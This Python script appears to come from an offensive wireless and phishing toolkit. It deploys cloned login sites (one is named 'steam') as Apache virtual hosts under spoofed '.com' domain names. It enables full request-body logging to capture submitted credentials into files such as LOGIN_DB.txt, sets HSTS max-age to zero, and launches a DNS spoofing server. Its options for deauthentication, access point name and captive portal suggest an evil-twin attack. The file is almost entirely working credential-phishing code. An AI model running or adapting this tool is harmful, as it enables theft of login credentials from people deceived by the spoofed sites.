#!/usr/bin/env python3

import subprocess
import os 
from subprocess import PIPE
import argparse
import sys
import shutil
import time
from zipfile import ZipFile

Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
def Set_Log():             
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"],shell=True)
    subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/DNS_SPOOFING_LOG.py"],shell=True)
    command_run = Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"
    command_proc3 = ' gnome-terminal  -e ' +'"' + command_run +'"'               
    call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
    if os.path.exists(Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt") :
       group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"Snake_Package/ServerLog/LOGIN_DB.txt" 
       os.system(group)
    with open(Curent_dir2+'/WEB_AUTH_db.txt','a') as DB_PASS :
        group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
        os.system(group1)       
      
class DNS_Spoofing:

        def __init__(self):
            self.parse_args()
            self.unzip_web()
           # self.write_hosts()
            self.VirtualHost_files()       
            self.DNS_COPY_WEB()
        def DNS_COPY_WEB(self):
            try:
                if os.path.exists("/var/www/html/steam"):
                   for folder in os.listdir(LOG_PATH+"/sites"):
                        remove_sites = 'sudo rm -r /var/www/html/'+f'{folder}'
                        os.system(remove_sites)
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+" > /dev/null 2>&1"
                        os.system(enable)  
                else:
                    for folder in os.listdir(LOG_PATH+"/sites"):
                        shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                        enable = "sudo a2ensite  "+f'{folder}'+"  >/dev/null 2>&1"
                        os.system(enable)
                command1 = 'sudo a2enmod dump_io >/dev/null 2>&1'
                subprocess.call(command1,shell=True,stderr=subprocess.PIPE)
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                command = "sudo a2enmod dumpio >/dev/null 2>&1"
                subprocess.call(command,shell=True,stderr=subprocess.PIPE)        
                os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                os.system("systemctl restart apache2 >/dev/null 2>&1")
                print("[+] DNS has been Start")
               
            except FileExistsError as r  :
                print("[+] error " ,r)
                exit()
        def VirtualHost_files(self):
            if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                path_remove = "sudo rm -r "+LOG_PATH+'/VirtualHostFile'
                os.system(path_remove)
                os.makedirs(LOG_PATH+'/VirtualHostFile')
                print("[+] VirtualHost files has been Create new intery ")
            else:    
                os.makedirs(LOG_PATH+'/VirtualHostFile')
                print("[+] VirtualHost Folder has been Created ")
                print("[+] VirtualHost files has been Created ")
            for file in os.listdir(LOG_PATH+"/sites"):
                with  open(LOG_PATH+'/VirtualHostFile/'+file+".conf",'w')as config :
                        config = config.write(
                                "<VirtualHost *:80>"+"\n"\
                                "\tServerAdmin   "+f'{file}'+'@'+ f'{file}'+".com"+'\n'\
                                '\t'+"ServerName   "+f'{file}'+".com"+'\n'\
                                "\t"+"ServerAlias  www."+f'{file}'+".com"+'\n'\
                                "\t"+"ServerAlias  "+f'{file}'+".com"+'\n'\
                                "\t"+"DocumentRoot /var/www/html/"+f'{file}'+'\n'+\
                                "\tErrorLog  "+LOG_PATH+"/ServerLog/log_error.log"+'\n'\
                                "\tCustomLog "+LOG_PATH+'/ServerLog/log_access.log combined'+'\n'\
                                "\t<IfModule mod_headers.c>"+'\n'\
                                """\t\tHeader set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS"""+'\n'\
                                "\t</IfModule>"+'\n'\
                                "\t<IfModule dir_module>"+'\n'\
                                "\t\tDirectoryIndex index.html"+'\n'\
                                "\t\tDirectoryIndex login.html"+'\n'\
                                "\t\tDirectoryIndex index.php"+'\n'\
                                "\t</IfModule>"+'\n'\
                                "\tDumpIOInput on"+'\n'\
                                "\tDumpIOOutput on"+'\n'\
                                "\tLogLevel dumpio:trace7"+'\n'\
                                "</VirtualHost>"+'\n'\
                                "<Directory "+"/var/www/html/"+f'{file}'+">"+'\n'+\
                                "\tOptions FollowSymLinks"+'\n'\
                                "\tAllowOverride None"+'\n'\
                                "\tRequire all granted"+'\n'\
                                "</Directory>"
                                )
            try:
                file_copy = 'sudo cp '+ LOG_PATH+'/VirtualHostFile/* /etc/apache2/sites-available/ '
                copy_VirtualHost = os.system(file_copy)
            except FileExistsError as r :
                   print(r)
                   exit()
        def write_hosts(self):
            if os.path.exists(LOG_PATH+'/resources/hosts.txt'):
               os.remove(LOG_PATH+'/resources/hosts.txt')
            else:
               pass
            for host in os.listdir(LOG_PATH+"/sites"):  
                with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
                   hosts.write('172.160.255.49  www.'+host+'.com     '+host+'.com'+'\n')       
        def unzip_web(self):
            if os.path.exists(Curent_dir2+'Snake_Package/sites'):
               Set_Log()
            else:     
                with ZipFile(LOG_PATH+'/resources/sites.zip','r') as unzipweb :
                    unzipweb.extractall(path=Curent_dir2+'Snake_Package/')
                Set_Log()            
        def parse_args(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-S ',"--Show",action='store_true')
            parser.add_argument( '-I ',"--Interface",action=None)                          
            parser.add_argument( '-AP ',"--APName",action=None)
            parser.add_argument( '-D ',"--Deauth",action=None)
            parser.add_argument( '-CP ',"--Portal",action='store_true')
            parser.add_argument( '-L ',"--List",action='store_true')
            parser.add_argument( '-T ',"--Target",action=None )
            parser.add_argument( '-P ',"--Packet",action=None ,type=int)
            parser.add_argument( '--dns',action='store_true')
            
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                
if __name__=='__main__':
     DNS_Spoofing()
